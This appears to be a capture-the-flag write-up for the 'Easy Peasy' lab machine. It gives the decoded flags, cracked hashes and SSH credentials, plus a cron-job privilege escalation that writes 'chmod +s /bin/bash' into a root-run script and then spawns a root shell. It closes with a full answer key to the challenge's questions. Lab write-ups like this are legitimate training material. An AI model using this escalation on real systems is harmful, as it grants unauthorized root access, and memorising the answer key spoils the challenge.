# Easy Peasy-SSH crendential expose&cron jobs privilege escalation

```
export IP=10.10.124.136
```

# Material needed

1. Interesting directory: /hidden/whatever

2. Decode first flag

```
ZmxhZ3tmMXJzN19mbDRnfQ==

base64 decode
flag{f1rs7_fl4g} 
```

3. crack second flag

```
a18672860d0510e5ab6699730763b250

md5 hash
flag{1m_s3c0nd_fl4g}
```

4. Decode hidden directory

```
ObsJmP173N2X6dOrAgEAL0Vu

base62 decode
/n0th1ng3ls3m4tt3r
```

5. Crack passphrase password

```
940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd8

mypasswordforthatjob
```

6. SSH credential

```
username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
```

7. Privilege escalation

```
cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh  --> interesting point


echo "chmod +s /bin/bash" >/var/www/.mysecretcronjob.sh

/bin/bash -p
```

# Tasks

1. How many ports are open? 3 

2. What is the version of nginx? 1.16.1

3. What is running on the highest port? Apache

4. Using GoBuster, find flag 1.

```
flag{f1rs7_fl4g}
```

5. Further enumerate the machine, what is flag 2?

```
flag{1m_s3c0nd_fl4g}
```

6. Crack the hash with easypeasy.txt, What is the flag 3?

```
flag{9fdafbd64c47471a8f54cd3fc64cd312}
```

7. What is the hidden directory?

```
/n0th1ng3ls3m4tt3r
```

8. what is the password?

```
mypasswordforthatjob
```

9. What is the password to login to the machine via SSH?

```
iconvertedmypasswordtobinary
```

10. What is the user flag?

```
flag{n0wits33msn0rm4l}
```

11. What is the root flag?

```
flag{63a9f0ea7bb98050796b649e85481845}
```